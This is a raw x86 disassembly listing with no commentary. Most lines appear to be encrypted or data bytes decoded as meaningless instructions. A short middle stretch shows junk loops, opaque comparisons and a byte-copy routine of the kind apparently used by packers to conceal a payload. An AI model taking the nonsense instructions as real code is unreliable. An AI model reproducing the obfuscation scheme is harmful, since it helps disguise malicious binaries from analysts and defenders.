  408079:	lgdtd  [edi+0x5f]
  40807d:	and    al,0x16
  40807f:	shl    DWORD PTR [edx-0x453d14fd],0x63
  408086:	xor    eax,0xf7df87c9
  40808b:	cdq    
  40808c:	jo     0x40804b
  40808e:	fiadd  DWORD PTR [edi-0x77]
  408091:	dec    eax
  408092:	mov    ds:0x770d5551,eax
  408097:	aas    
  408098:	push   ss
  408099:	or     eax,0xd50c518
  40809e:	jbe    0x40809b
  4080a0:	push   ebx
  4080a1:	outs   dx,DWORD PTR ds:[esi]
  4080a2:	jns    0x4080bc
  4080a4:	iret   
  4080a5:	out    0xcf,eax
  4080a7:	jl     0x408050
  4080a9:	mov    ds:0x96589942,eax
  4080ae:	jle    0x4080ca
  4080b0:	ins    BYTE PTR es:[edi],dx
  4080b1:	xlat   BYTE PTR ds:[ebx]
  4080b2:	mov    ch,0x86
  4080b4:	arpl   WORD PTR [ebx],si
  4080b6:	push   esi
  4080b7:	fcmovbe st,st(5)
  4080b9:	daa    
  4080ba:	test   eax,0xd1e12388
  4080bf:	ja     0x40804a
  4080c1:	es ret 
  4080c3:	push   edx
  4080c4:	js     0x4080c0
  4080c6:	popa   
  4080c7:	fwait
  4080c8:	xchg   edi,ecx
  4080ca:	loope  0x408107
  4080cc:	test   BYTE PTR [ecx],0x6a
  4080cf:	scas   eax,DWORD PTR es:[edi]
  4080d0:	lea    ebp,[edx+0x5e]
  4080d3:	mov    ecx,0x5e10c714
  4080d8:	aas    
  4080d9:	jl     0x4080b3
  4080db:	mov    bl,0x22
  4080dd:	into   
  4080de:	call   0xccda6060
  4080e3:	and    ebx,esp
  4080e5:	jmp    0xc2f4:0x7174b79c
  4080ec:	int3   
  4080ed:	fidivr DWORD PTR [eax+0x11]
  4080f0:	stc    
  4080f1:	aas    
  4080f2:	xor    DWORD PTR [eax],edi
  4080f4:	aam    0x2b
  4080f6:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080f8:	pop    ebp
  4080f9:	ret    0x2986
  4080fc:	es jle 0x408154
  4080ff:	adc    BYTE PTR [eax-0x27710678],dh
  408105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408106:	mov    bl,0xd6
  408108:	scas   al,BYTE PTR es:[di]
  40810a:	cmp    DWORD PTR [ebx+0x7695f673],esp
  408110:	cwde   
  408111:	sbb    BYTE PTR [ebx-0x69],cl
  408114:	pop    ds
  408115:	pop    ecx
  408116:	mov    eax,ds:0x58de769f
  40811b:	xchg   DWORD PTR [bx],edx
  40811e:	imul   esp,esi,0xc
  408121:	in     eax,dx
  408122:	adc    al,0x5
  408124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408125:	scas   eax,DWORD PTR es:[edi]
  408126:	xor    bl,BYTE PTR [edi+esi*8+0x7473ad42]
  40812d:	(bad)  
  40812f:	add    BYTE PTR [edx+0x156ed9ad],ah
  408135:	add    BYTE PTR [ecx+ecx*8+0x41],cl
  408139:	jbe    0xe38115e4
  40813f:	ja     0x408150
  408141:	fdiv   st(3),st
  408143:	dec    edx
  408144:	push   ds
  408145:	icebp  
  408146:	ins    DWORD PTR es:[edi],dx
  408147:	and    eax,0xaa0d5b43
  40814c:	rcr    DWORD PTR [esi+0x13134af2],0x6c
  408153:	je     0x4081d3
  408155:	jbe    0x4081a0
  408157:	push   cs
  408158:	ja     0x4081d3
  40815a:	test   ecx,esp
  40815c:	jns    0x408135
  40815e:	mov    DWORD PTR [ecx+0x487e0627],eax
  408164:	xlat   BYTE PTR ds:[ebx]
  408165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408166:	das    
  408167:	xor    ebx,0x4693ac53
  40816d:	jmp    0x1e2869f5
  408172:	jge    0x4081bd
  408174:	jg     0x4081ae
  408176:	jmp    0xf153:0xb1e63992
  40817d:	push   esp
  40817e:	jmp    ecx
  408180:	sbb    al,0xd0
  408182:	sbb    eax,0x37aa5eac
  408187:	sbb    eax,0x180502d0
  40818c:	xchg   esi,eax
  40818d:	std    
  40818e:	sbb    DWORD PTR [ebp+ebp*4+0x21151c66],edx
  408195:	(bad)  
  408196:	hlt    
  408197:	cmp    edx,esi
  408199:	rol    DWORD PTR [eax+eax*1+0x66],0xc0
  40819e:	out    dx,al
  40819f:	fist   DWORD PTR [ecx]
  4081a1:	out    0x86,eax
  4081a3:	imul   esi,DWORD PTR [eax+0x4d8a118a],0xffffffe6
  4081aa:	mov    esp,0xc88fecef
  4081af:	xchg   ebp,eax
  4081b0:	and    bl,BYTE PTR [edi+0x2c]
  4081b3:	cmp    DWORD PTR [ecx-0x2],eax
  4081b6:	call   0x26ce:0xfb1139de
  4081bd:	dec    eax
  4081be:	or     eax,eax
  4081c0:	rcl    bh,cl
  4081c2:	mov    ch,0x50
  4081c4:	enter  0x5472,0xa
  4081c8:	xchg   esp,eax
  4081c9:	mov    cl,0x4c
  4081cb:	imul   eax,DWORD PTR [edx+ecx*8],0x231ded30
  4081d2:	inc    edx
  4081d3:	test   al,0xe0
  4081d5:	mov    esi,0x188c122b
  4081da:	mov    esp,0x72799adf
  4081df:	inc    esp
  4081e0:	out    0x9,al
  4081e2:	sub    edi,edi
  4081e4:	mov    BYTE PTR [edx],cl
  4081e6:	sbb    al,0x8b
  4081e8:	popa   
  4081e9:	and    DWORD PTR [ecx+eax*1+0x2da8d98d],esp
  4081f0:	sbb    al,BYTE PTR ds:0x18bbb36f
  4081f6:	fcomp  QWORD PTR [edx+ebp*4]
  4081f9:	pop    ss
  4081fa:	test   DWORD PTR [ebp-0x71154cd7],0xd8b2ec08
  408204:	ss adc al,0xa
  408207:	in     eax,0x2f
  408209:	popa   
  40820a:	je     0x4081a9
  40820c:	retf   
  40820d:	dec    ebx
  40820e:	repz clc 
  408210:	aad    0x5
  408212:	xchg   esi,eax
  408213:	stos   BYTE PTR es:[edi],al
  408214:	pop    es
  408215:	or     DWORD PTR [esp+ebx*1-0x12],ecx
  408219:	ss out 0x75,eax
  40821c:	cmp    DWORD PTR [edi-0x1e2d9a39],edx
  408222:	inc    ecx
  408223:	das    
  408224:	fisttp QWORD PTR [ebp-0x11]
  408227:	sbb    eax,0x98fc3c2
  40822c:	nop
  40822d:	sahf   
  40822e:	mov    ds:0xc228cf78,al
  408233:	ds sti 
  408235:	rcr    DWORD PTR [ebx+0x46a8499c],0xc2
  40823c:	add    ebx,DWORD PTR [esi+ebp*1]
  40823f:	outs   dx,DWORD PTR ds:[esi]
  408240:	retf   0x1683
  408243:	pop    ds
  408244:	mov    bh,0xcf
  408246:	fs mov dl,0xda
  408249:	clc    
  40824a:	rol    DWORD PTR [esi-0x25],0x99
  40824e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40824f:	ja     0x40826d
  408251:	mov    cs,WORD PTR [ebx+0x98698a1]
  408257:	pop    es
  408258:	fisttp QWORD PTR [edi+esi*8]
  40825b:	or     DWORD PTR [ebx],ebx
  40825d:	sbb    bl,dl
  40825f:	shl    BYTE PTR [ebp+0x7c6e1ebd],1
  408265:	test   esi,esi
  408267:	in     eax,dx
  408268:	imul   esi,esp,0x33527595
  40826e:	inc    ecx
  40826f:	sbb    DWORD PTR [esi],esi
  408271:	jno    0x408223
  408273:	sbb    al,0x48
  408275:	and    bl,BYTE PTR [ecx+0x33d51405]
  40827b:	fist   DWORD PTR [ebx+0x63c0905e]
  408281:	out    0xa2,eax
  408283:	les    edx,FWORD PTR [ebp+0x595fdf14]
  408289:	sbb    eax,0x3d1187cf
  40828e:	cmc    
  40828f:	aaa    
  408290:	jnp    0x4082f8
  408292:	cwde   
  408293:	hlt    
  408294:	daa    
  408295:	inc    ecx
  408296:	xor    ch,BYTE PTR [edi-0x59]
  408299:	mov    al,0x69
  40829b:	lahf   
  40829c:	jno    0x40826f
  40829e:	dec    edx
  40829f:	jl     0x408276
  4082a1:	rol    al,1
  4082a3:	fld    DWORD PTR [edi-0x619a8be2]
  4082a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082aa:	pushf  
  4082ab:	or     BYTE PTR [ebx+0x9],dh
  4082ae:	int    0x23
  4082b0:	lock iret 
  4082b2:	mov    ah,0x79
  4082b4:	mov    eax,ds:0x12149c91
  4082b9:	test   BYTE PTR [edx+0x13ae8c03],cl
  4082bf:	(bad)
  4082c3:	inc    esp
  4082c4:	and    BYTE PTR [edi],cl
  4082c6:	sub    ch,BYTE PTR [ebx+0x6d932b5e]
  4082cc:	inc    ecx
  4082cd:	jo     0x40831f
  4082cf:	push   0x444d68b6
  4082d4:	pop    ebx
  4082d5:	rol    DWORD PTR ds:0x326ce9f,cl
  4082db:	xchg   edx,ebx
  4082dd:	add    ah,BYTE PTR ss:[ebx-0x60ca5fd6]
  4082e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e5:	xchg   esp,eax
  4082e6:	pop    ecx
  4082e7:	cmp    ecx,edx
  4082e9:	test   BYTE PTR [eax+edi*2+0x11],dh
  4082ed:	imul   esp,DWORD PTR [esi+0x409f0ee0],0xb20712c1
  4082f7:	ins    DWORD PTR es:[edi],dx
  4082f8:	fidivr WORD PTR [ebx+0x1f]
  4082fb:	les    ebx,FWORD PTR [esi]
  4082fd:	mov    ecx,DWORD PTR [edi-0x127b366c]
  408303:	mov    al,dl
  408305:	mov    bl,0xb8
  408307:	lock mov esi,ebp
  40830a:	jmp    0x5812677d
  40830f:	dec    esp
  408310:	pop    ebx
  408311:	mov    ds:0xa71269ba,eax
  408316:	jno    0x408324
  408318:	std    
  408319:	add    BYTE PTR fs:[edi-0x49b837e8],cl
  408320:	and    bl,BYTE PTR [eax-0x3d5b7d31]
  408326:	ret    
  408327:	inc    ebx
  408328:	out    dx,eax
  408329:	sti    
  40832a:	fadd   QWORD PTR [esi+ecx*8-0x493cfe6d]
  408331:	test   bh,dh
  408333:	mov    ch,0xf3
  408335:	shl    BYTE PTR ds:0x838ed2f,0xca
  40833c:	mov    edi,0xf884e6e7
  408341:	mov    ebp,DWORD PTR [eax]
  408343:	inc    ebx
  408344:	add    eax,0x1ba95363
  408349:	inc    ebp
  40834a:	jg     0x4082e9
  40834c:	or     BYTE PTR [ecx],dl
  40834e:	add    esp,eax
  408350:	call   0x9c47ca5f
  408355:	pop    ebp
  408356:	xchg   esp,eax
  408357:	mul    DWORD PTR [edx-0x43]
  40835a:	stc    
  40835b:	dec    esp
  40835c:	(bad)  [edx+0x31d198c4]
  408362:	cmp    ah,al
  408364:	cmovge edi,DWORD PTR [edx]
  408367:	add    BYTE PTR ds:0x24ea038a,0xdb
  40836e:	ror    BYTE PTR [edx+0x4671cb58],0x2f
  408375:	lds    ebp,FWORD PTR [ebx+0x42]
  408378:	out    0xbb,al
  40837a:	jg     0x408393
  40837c:	jns    0x408345
  40837e:	out    0xa6,eax
  408380:	or     edx,ebx
  408382:	in     al,dx
  408383:	push   ds
  408384:	not    BYTE PTR [edi]
  408386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408387:	das    
  408388:	out    dx,al
  408389:	push   ecx
  40838a:	rep lods eax,DWORD PTR ds:[esi]
  40838c:	adc    eax,0xbcbad017
  408391:	inc    edx
  408392:	dec    edx
  408393:	fs stos DWORD PTR es:[edi],eax
  408395:	nop
  408396:	les    esp,FWORD PTR [ebx+ecx*4]
  408399:	push   edx
  40839a:	mov    bl,0x13
  40839c:	leave  
  40839d:	int    0xc9
  40839f:	das    
  4083a0:	ret    0x311f
  4083a3:	dec    ecx
  4083a4:	imul   ebp,DWORD PTR [eax+0x42],0xef119d4a
  4083ab:	mov    ecx,0xd68a2d0d
  4083b0:	in     eax,dx
  4083b1:	das    
  4083b2:	adc    eax,DWORD PTR [eax+0x7995d92]
  4083b8:	add    ebp,edx
  4083ba:	add    eax,0x7794e45d
  4083bf:	mul    DWORD PTR [ebx-0x22]
  4083c2:	dec    esi
  4083c3:	mov    al,BYTE PTR [ebx]
  4083c5:	xor    bl,ah
  4083c7:	and    BYTE PTR [edx],bl
  4083c9:	jl     0x40834d
  4083cb:	fstp   DWORD PTR gs:[eax-0x559dff34]
  4083d2:	mov    bl,0x3b
  4083d4:	jg     0x4083b9
  4083d6:	jae    0x4083d6
  4083d8:	mov    bl,0xd3
  4083da:	inc    ecx
  4083db:	stos   BYTE PTR es:[edi],al
  4083dc:	loopne 0x408443
  4083de:	inc    esp
  4083df:	mov    bl,0xbf
  4083e1:	ret    
  4083e2:	sub    al,0xd8
  4083e4:	pop    eax
  4083e5:	and    al,0xb
  4083e7:	paddw  mm0,QWORD PTR [ecx-0x4f072579]
  4083ee:	mov    esi,DWORD PTR [ebp+eiz*1+0x6985d671]
  4083f5:	push   0xffffffe4
  4083f7:	and    eax,esp
  4083f9:	test   BYTE PTR [edx],dl
  4083fb:	leave  
  4083fc:	xchg   esi,eax
  4083fd:	push   cs
  4083fe:	out    0xa8,al
  408400:	push   0xffffffca
  408402:	xchg   edi,eax
  408403:	mov    bl,0x58
  408405:	fwait
  408406:	and    edi,DWORD PTR [edx+0x6cdbf38b]
  40840c:	cmp    eax,0xc2c95b5e
  408411:	or     al,0x0
  408413:	push   ebp
  408414:	mov    ebp,esp
  408416:	mov    DWORD PTR ds:0x42408f,0xf89c85b5
  408420:	mov    DWORD PTR ds:0x42a00c,0x7dd6
  40842a:	pop    ebp
  40842b:	jmp    0x41b7a1
  408430:	xor    eax,eax
  408432:	or     DWORD PTR ds:0x42b010,0x429008
  40843c:	inc    eax
  40843d:	ret    
  40843e:	push   ebp
  40843f:	mov    ebp,esp
  408441:	sub    esp,0x10
  408444:	sbb    ecx,DWORD PTR ds:0x42d008
  40844a:	mov    eax,0xf89c85b6
  40844f:	mov    edx,DWORD PTR ds:0x42b000
  408455:	add    DWORD PTR ds:0x42c018,edx
  40845b:	mov    DWORD PTR [ebp-0x4],eax
  40845e:	dec    edx
  40845f:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  408466:	mov    DWORD PTR ds:0x42b01c,0x18
  408470:	cmp    DWORD PTR ds:0x42b01c,0x0
  408477:	je     0x4084ad
  40847d:	cmp    DWORD PTR ds:0x42b01c,0x1b
  408484:	jne    0x40849b
  40848a:	push   DWORD PTR [ebp-0x28]
  40848d:	push   0x7565
  408492:	push   DWORD PTR [ebp-0x18]
  408495:	call   DWORD PTR ds:0x425040
  40849b:	mov    edx,DWORD PTR ds:0x42b01c
  4084a1:	dec    edx
  4084a2:	mov    DWORD PTR ds:0x42b01c,edx
  4084a8:	jmp    0x408470
  4084ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b0:	xor    edx,DWORD PTR ds:0x42b008
  4084b6:	push   esi
  4084b7:	mov    DWORD PTR ds:0x42c000,0x17
  4084c1:	cmp    DWORD PTR ds:0x42c000,0x0
  4084c8:	je     0x408518
  4084ce:	cmp    DWORD PTR ds:0x42c000,0xa
  4084d5:	jne    0x4084ec
  4084db:	push   0x8fa2
  4084e0:	push   DWORD PTR [ebp-0x24]
  4084e3:	push   DWORD PTR [ebp-0xc]
  4084e6:	call   DWORD PTR ds:0x425044
  4084ec:	cmp    DWORD PTR ds:0x42c000,0xb
  4084f3:	jne    0x408506
  4084f9:	mov    edx,DWORD PTR ds:0x42c000
  4084ff:	dec    edx
  408500:	mov    DWORD PTR ds:0x42c000,edx
  408506:	mov    edx,DWORD PTR ds:0x42c000
  40850c:	dec    edx
  40850d:	mov    DWORD PTR ds:0x42c000,edx
  408513:	jmp    0x4084c1
  408518:	mov    edx,0x7510893
  40851d:	xor    ecx,edx
  40851f:	and    DWORD PTR ds:0x429018,0x2759
  408529:	mov    esi,0x3272db
  40852e:	mov    DWORD PTR ds:0x42b01c,0x64d9
  408538:	push   edi
  408539:	mov    DWORD PTR ds:0x42c000,0x1c
  408543:	cmp    DWORD PTR ds:0x42c000,0x0
  40854a:	je     0x4085a2
  408550:	cmp    DWORD PTR ds:0x42c000,0xb
  408557:	jne    0x408573
  40855d:	push   DWORD PTR [ebp-0xc]
  408560:	push   DWORD PTR [ebp-0x10]
  408563:	push   0x6908
  408568:	push   0x2a1a
  40856d:	call   DWORD PTR ds:0x425048
  408573:	cmp    DWORD PTR ds:0x42c000,0xc
  40857a:	jne    0x40858f
  408580:	xor    edi,edi
  408582:	xor    edi,DWORD PTR ds:0x42c000
  408588:	dec    edi
  408589:	mov    DWORD PTR ds:0x42c000,edi
  40858f:	mov    edi,DWORD PTR ds:0x42c000
  408595:	dec    edi
  408596:	mov    DWORD PTR ds:0x42c000,edi
  40859c:	jmp    0x408543
  4085a1:	dec    edi
  4085a2:	mov    edi,DWORD PTR [ebp+0x10]
  4085a5:	xor    DWORD PTR ds:0x429004,0x6210
  4085af:	add    ecx,esi
  4085b1:	cmp    ecx,edi
  4085b3:	je     0x408678
  4085b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4085bc:	mov    edi,DWORD PTR [ebp+0x10]
  4085bf:	xor    eax,eax
  4085c1:	xor    ecx,edx
  4085c3:	add    ecx,esi
  4085c5:	add    edi,0xfabdbef1
  4085cb:	adc    eax,0xffffffff
  4085ce:	xor    eax,0x0
  4085d1:	mov    DWORD PTR [ebp-0xc],eax
  4085d4:	push   ebx
  4085d5:	xor    ebx,ebx
  4085d7:	xor    edi,0x8a29a123
  4085dd:	mov    eax,ecx
  4085df:	add    eax,0xfabdbef1
  4085e4:	adc    ebx,0xffffffff
  4085e7:	xor    eax,0x8a29a123
  4085ec:	xor    ebx,0x0
  4085ef:	cmp    eax,edi
  4085f1:	jne    0x40860a
  4085f7:	cmp    ebx,DWORD PTR [ebp-0xc]
  4085fa:	je     0x408672
  408600:	jmp    0x40860a
  408605:	mov    esi,0x3272db
  40860a:	mov    eax,DWORD PTR [ebp-0x4]
  40860d:	mov    edi,DWORD PTR [ebp-0x8]
  408610:	xor    edi,edx
  408612:	add    edi,esi
  408614:	mov    esi,DWORD PTR [ebp+0x8]
  408617:	imul   edi,ecx
  40861a:	mov    ebx,DWORD PTR [ebp+0xc]
  40861d:	xor    eax,edx
  40861f:	add    eax,ecx
  408621:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  408628:	mov    BYTE PTR [edi+esi*1],al
  40862b:	mov    eax,DWORD PTR [ebp-0x8]
  40862e:	mov    esi,DWORD PTR [ebp+0x10]
  408631:	xor    eax,edx
  408633:	xor    ebx,ebx
  408635:	add    esi,0xfabdbef1
  40863b:	adc    ebx,0xffffffff
  40863e:	lea    ecx,[ecx+eax*1+0x3272db]
  408645:	xor    edi,edi
  408647:	xor    esi,0x8a29a123
  40864d:	xor    ebx,0x0
  408650:	mov    eax,ecx
  408652:	add    eax,0xfabdbef1
  408657:	adc    edi,0xffffffff
  40865a:	xor    eax,0x8a29a123
  40865f:	xor    edi,0x0
  408662:	cmp    eax,esi
  408664:	jne    0x408605
  40866a:	cmp    edi,ebx
  40866c:	jne    0x408605
  408672:	mov    eax,0xf89c85b5
  408677:	pop    ebx
  408678:	pop    edi
  408679:	pop    esi
  40867a:	leave  
  40867b:	ret    0xc
  40867e:	push   ebp
  40867f:	mov    ebp,esp
  408681:	sub    esp,0x78
  408684:	adc    DWORD PTR ds:0x429000,0x42d00c
  40868e:	push   ebx
  40868f:	or     DWORD PTR ds:0x42d000,0x5016
  408699:	push   esi
  40869a:	sbb    DWORD PTR ds:0x42d008,0x6d64
  4086a4:	push   edi
  4086a5:	push   0x1f
  4086a7:	and    DWORD PTR ds:0x42d018,0x1f4a
  4086b1:	lea    eax,[ebp-0x78]
  4086b4:	push   eax
  4086b5:	not    DWORD PTR ds:0x42c008
  4086bb:	push   0x0
  4086bd:	xor    DWORD PTR ds:0x429008,0x2961
  4086c7:	jmp    0x40aa2c
  4086cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cd:	xchg   esi,eax
  4086ce:	sub    edx,ebp
  4086d0:	out    0x65,eax
  4086d2:	arpl   WORD PTR [ebx+eiz*8-0x48e5aa73],dx
  4086d9:	xor    al,0x23
  4086db:	add    DWORD PTR [eax+0x18],edx
  4086de:	bound  esp,QWORD PTR [edx+0x3a]
  4086e1:	pop    edi
  4086e2:	bound  esp,QWORD PTR [edx-0x53]
  4086e5:	push   ss
  4086e6:	push   ds
  4086e7:	retf   0x2cea
  4086ea:	push   esp
  4086eb:	arpl   WORD PTR [ebx+eax*8-0x4f],sp
  4086ef:	mov    ds:0xfe3fdf5c,al
  4086f4:	out    dx,eax
  4086f5:	nop
  4086f6:	push   eax
  4086f7:	cmp    ch,BYTE PTR [eax-0x5dba88f3]
  4086fd:	clc    
  4086fe:	sbb    bl,BYTE PTR [esi+0x3c]
  408701:	push   ebp
  408702:	add    al,0xc6
  408704:	mov    ebx,0x62842198
  408709:	neg    DWORD PTR [esi]
  40870b:	inc    edx
  40870c:	js     0x4086fa
  40870e:	push   ds
  40870f:	ins    BYTE PTR es:[edi],dx
  408710:	ins    DWORD PTR es:[edi],dx
  408711:	push   ss
  408712:	popf   
  408713:	in     eax,0x23
  408715:	and    edx,edi
  408717:	(bad)  
  408718:	iret   
  408719:	pop    ebp
  40871a:	cvttps2pi mm5,QWORD PTR [ecx+0x40]
  40871e:	xchg   DWORD PTR [ebx+edx*2+0x60],esi
  408722:	imul   esi,DWORD PTR [esi-0x1218c159],0xffffffff
  408729:	push   edx
  40872a:	dec    BYTE PTR [ecx-0x35d311]
  408730:	in     al,dx
  408731:	mov    WORD PTR [esi-0x13c6f70c],cs
  408737:	fs loopne 0x4087ad
  40873a:	call   0x89f2:0x9cb200da
  408741:	or     esi,DWORD PTR [edi+0x6]
  408744:	pop    esp
  408745:	std    
  408746:	pop    eax
  408747:	add    al,0xc0
  408749:	sbb    dh,dh
  40874b:	sbb    ah,0xe9
  40874e:	mov    bh,BYTE PTR [ebp+0x4f]
  408751:	addr16 addr16 pop es
  408754:	retf   0xf3b3
  408757:	xchg   ecx,eax
  408758:	jbe    0x4086fb
  40875a:	mov    eax,ds:0x578bd24e
  40875f:	pusha  
  408760:	stos   DWORD PTR es:[edi],eax
  408761:	nop
  408762:	mov    BYTE PTR ds:0xd2d0cad4,ch
  408768:	scas   al,BYTE PTR es:[edi]
  408769:	push   esp
  40876a:	mov    ebx,0x7246778b
  40876f:	sub    eax,0xbba43924
  408774:	(bad)  
  408775:	fimul  WORD PTR [ebx-0xd]
  408778:	inc    edx
  408779:	pop    esi
  40877a:	jp     0x40879b
  40877c:	outs   dx,DWORD PTR ds:[esi]
  40877d:	cli    
  40877e:	push   edx
  40877f:	call   DWORD PTR [esi+0x46a1c38b]
  408785:	adc    DWORD PTR [edx-0x1c],edx
  408788:	dec    edx
  408789:	mov    eax,0xdb6ed0e6
  40878e:	call   0x9737:0x1d84aab4
  408795:	gs je  0x40878a
  408798:	sbb    edi,DWORD PTR [edi-0x398a7739]
  40879e:	cmp    al,0x23
  4087a1:	jo     0x4087e0
  4087a3:	iretw  
  4087a5:	popf   
  4087a6:	bound  edx,QWORD PTR [edi]
  4087a8:	mov    dh,BYTE PTR [esp+eax*1]
  4087ab:	out    0x38,eax
  4087ad:	inc    eax
  4087ae:	mov    WORD PTR ds:0xb9d9e3ce,?
  4087b4:	mov    esp,0xd6d4203e
  4087b9:	xchg   DWORD PTR [ebx-0x7cbac12a],ebx
  4087bf:	jl     0x40874b
  4087c1:	mov    cl,0xfa
  4087c3:	or     DWORD PTR [esi-0x40],ebx
  4087c6:	push   0x4d
  4087c8:	icebp  
  4087c9:	add    edx,esi
  4087cb:	out    dx,eax
  4087cc:	sahf   
  4087cd:	aas    
  4087ce:	aam    0x8f
  4087d0:	retf   
  4087d1:	xchg   edi,eax
  4087d2:	jmp    0xd5678e80
  4087d7:	lods   eax,DWORD PTR ds:[esi]
  4087d8:	xchg   DWORD PTR [edx-0x51eaf753],edi
  4087de:	sbb    edi,ebx
  4087e0:	push   edx
  4087e1:	push   0xffffffa7
  4087e3:	fs aas 
  4087e5:	int    0x6d
  4087e7:	test   eax,0x421837a
  4087ec:	pop    ss
  4087ed:	inc    ebx
  4087ee:	mov    ds:0x551a66d7,al
  4087f3:	(bad)  
  4087f4:	aad    0x2e
  4087f6:	(bad)  
  4087f7:	clc    
  4087f8:	adc    eax,0x320a0d20
  4087fd:	add    DWORD PTR [edx],0x48c12d8a
  408803:	pushf  
  408804:	pop    ebx
  408805:	aam    0x8d
  408807:	in     al,dx
  408808:	loope  0x4087d6
  40880a:	call   esi
  40880c:	daa    
  40880d:	jle    0x4087f9
  40880f:	adc    ebp,DWORD PTR [edx-0x78]
  408812:	(bad)  
  408813:	out    dx,eax
  408814:	xor    al,0x45
  408816:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408818:	xchg   ecx,eax
  408819:	(bad)  [edx]
  40881b:	jns    0x408817
  40881d:	out    dx,eax
  40881e:	jb     0x40885f
  408820:	xor    al,0x95
  408822:	mov    esp,0x61100544
  408827:	dec    edx
  408828:	dec    esp
  408829:	imul   edi,DWORD PTR [eax],0xa011fd48
  40882f:	popa   
  408830:	cmc    
  408831:	cmp    al,0x2d
  408833:	test   BYTE PTR [ebx],ah
  408835:	mov    DWORD PTR [esi+0x3c],ebp
  408838:	and    dh,BYTE PTR [edx]
  40883a:	jae    0x408824
  40883c:	mov    eax,ds:0xc2ae67b4
  408841:	xchg   esi,eax
  408842:	(bad)  
  408843:	ds stos DWORD PTR es:[edi],eax
  408845:	lods   al,BYTE PTR ds:[esi]
  408846:	jge    0x408816
  408848:	pop    edi
  408849:	or     BYTE PTR [ebx],ah
  40884b:	(bad)  
  40884c:	cwde   
  40884d:	retf   
  40884e:	jmp    0xe94a317c
  408853:	adc    eax,0xd98a97c5
  408858:	mov    al,0x71
  40885a:	lahf   
  40885b:	iret   
  40885c:	fs shl eax,1
  40885f:	adc    al,0xe1
  408861:	sbb    BYTE PTR [ebx-0x7fb0100a],0xe9
  408868:	xchg   esi,eax
  408869:	es ret 
  40886b:	adc    BYTE PTR [edx],0xb7
  40886e:	mov    al,ds:0x2f74de5a
  408873:	ins    BYTE PTR es:[edi],dx
  408874:	in     al,dx
  408875:	call   0xb14d:0x8e808ea3
  40887c:	cld    
  40887d:	add    dl,BYTE PTR [esi-0x70fcbf47]
  408883:	js     0x408892
  408885:	xlat   BYTE PTR ds:[ebx]
  408886:	ror    BYTE PTR [ecx+0x173db5bf],cl
  40888c:	lods   eax,DWORD PTR ds:[esi]
  40888d:	adc    eax,0x754f738b
  408892:	outs   dx,DWORD PTR ds:[esi]
  408893:	pop    eax
  408894:	sub    DWORD PTR [edi+0x0],ebx
  408897:	xchg   ebx,eax
  408898:	dec    esp
  408899:	pop    ss
  40889a:	pop    edi
  40889b:	out    dx,al
  40889c:	out    dx,eax
  40889d:	lods   al,BYTE PTR es:[esi]
  40889f:	cmp    BYTE PTR [esi-0x4e],al
  4088a2:	pop    ebx
  4088a3:	repnz dec ebp
  4088a5:	jle    0x408849
  4088a7:	or     DWORD PTR [esp+eiz*2+0x6c],ebp
  4088ab:	jp     0x40891b
  4088ad:	(bad)  
  4088ae:	inc    ebx
  4088af:	inc    ebp
  4088b0:	call   0xfd5f:0x547ed4d7
  4088b7:	fidiv  WORD PTR [edx]
  4088b9:	cld    
  4088ba:	push   0xf6df8dcb
  4088bf:	out    dx,al
  4088c0:	xchg   ebp,eax
  4088c1:	mov    bl,0x88
  4088c3:	dec    eax
  4088c4:	mov    esp,0x4b0f0956
  4088c9:	xlat   BYTE PTR ds:[ebx]
  4088ca:	test   BYTE PTR [eax-0x579ed14a],bh
  4088d0:	stos   BYTE PTR es:[edi],al
  4088d1:	por    mm0,QWORD PTR [ebp-0x60382cbe]
  4088d8:	add    ebp,DWORD PTR [ecx+0x4cba3c3e]
  4088de:	imul   ebx,edi,0xffffff85
  4088e1:	add    DWORD PTR [esi-0x77ba4410],ebp
  4088e7:	(bad)  
  4088e8:	xchg   ecx,eax
  4088e9:	retf   
  4088ea:	dec    edx
  4088eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ec:	xor    eax,0x5202b35f
  4088f1:	aam    0x73
  4088f3:	rol    BYTE PTR [esp+eax*2+0x499d1623],0xf9
  4088fb:	rcr    BYTE PTR [ebp-0x21],cl
  4088fe:	jmp    0x408929
  408900:	clc    
  408901:	inc    ecx
  408902:	push   esp
  408903:	outs   dx,DWORD PTR ds:[esi]
  408904:	push   ebp
  408905:	xor    eax,0xdc40c2c4
  40890a:	int    0xdf
  40890c:	lods   eax,DWORD PTR ds:[esi]
  40890d:	and    eax,0xdaea9757
  408912:	mov    ch,BYTE PTR [ebp-0x11]
  408915:	jno    0x408910
  408917:	fstp   TBYTE PTR [edi]
  408919:	adc    BYTE PTR [esi],bh
  40891b:	jl     0x408916
  40891d:	lock stos BYTE PTR es:[edi],al
  40891f:	push   0x2142eef4
  408924:	inc    eax
  408925:	sbb    DWORD PTR [eax+0x55bb5c3a],0xac283982
  40892f:	fisttp DWORD PTR [eax+0x6347cab8]
  408935:	es inc esp
  408937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408938:	call   0xf083:0x2549102
  40893f:	xchg   ebp,eax
  408940:	xchg   edx,eax
  408941:	or     cl,bl
  408943:	ror    BYTE PTR [edi],0x1c
  408946:	jnp    0x408972
  408948:	mov    ds:0xdc250da1,eax
  40894d:	icebp  
  40894e:	loope  0x4088d7
  408950:	xor    eax,0x4f6650e
  408955:	(bad)  
  408956:	out    dx,eax
  408957:	popf   
  408958:	dec    edi
  408959:	retf   0x86bf
  40895c:	add    edi,ebx
  40895e:	adc    BYTE PTR [ecx+0x17],ch
  408961:	and    eax,0xca9f2a99
  408966:	or     BYTE PTR [ecx+0x6f9c53ed],cl
  40896c:	pop    esp
  40896d:	(bad)  
